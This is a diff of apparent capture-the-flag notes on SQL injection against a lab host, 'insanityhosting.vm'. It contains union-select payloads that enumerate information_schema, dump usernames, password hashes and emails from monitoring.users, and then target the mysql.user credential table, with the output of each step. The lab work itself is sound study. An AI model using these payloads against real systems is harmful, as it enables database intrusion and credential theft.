@@ -175,8 +175,9 @@ d" union select concat(table_name,"-",table_schama),2,3,4 from information_schem
     mysql-columns_priv,2,3,4
     mysql-db,2,3,4
     mysql-event,2,3,4
+    mysql-user,2,3,4
 
-# monitoring-users,2,3,4 may be useful
+# monitoring-users,2,3,4 and mysql-user,2,3,4 may be useful
 
 coluofmon" union select column_name,2,3,4 from information_schema.columns where table_schema ='monitoring' and table_name = 'users'#
   #to get column_name
@@ -195,3 +196,18 @@ f" union select id,username,password,email from monitoring.users#
   1,admin,$2y$12$huPSQmbcMvgHDkWIMnk9t.1cLoBWue3dtHf9E5cKUNcfKTOOp8cma,admin@insanityhosting.vm
   2,nicholas,$2y$12$4R6JiYMbJ7NKnuQEoQW4ruIcuRJtDRukH.Tvx52RkUfx5eloIw7Qe,nicholas@insanityhosting.vm
   3,otis,$2y$12$./XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFW,otis@insanityhosting.vm
+#the passwd is encrypted.
+
+#try mysql-user table
+#coluofmysql" union select column_name,2,3,4 from information_schema.columns where table_schema ='mysql' and table_name = 'user'#
+
+coluofmysql" union select column_name,2,3,4 from information_schema.columns where
+table_schema ='mysql' and table_name = 'user'# is down. Please check the report
+below for more information.
+
+ID, Host, Date Time, Status
+Host,2,3,4
+User,2,3,4
+Password,2,3,4
+
+g" union select Host,User,Password,null from mysql.user#
